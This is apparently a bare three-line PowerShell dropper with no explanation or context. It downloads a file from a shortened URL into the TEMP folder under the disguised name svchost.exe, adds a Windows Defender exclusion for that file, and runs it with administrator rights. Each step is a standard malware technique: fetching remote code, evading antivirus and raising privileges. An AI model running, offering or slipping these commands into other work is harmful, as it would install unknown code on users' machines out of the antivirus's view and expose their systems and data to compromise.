iwr is.gd/bBae3o -o $env:TEMP\svchost.exe
add-mppreference -exclusionpath $env:TEMP\svchost.exe
start-process $env:TEMP\svchost.exe -verb runas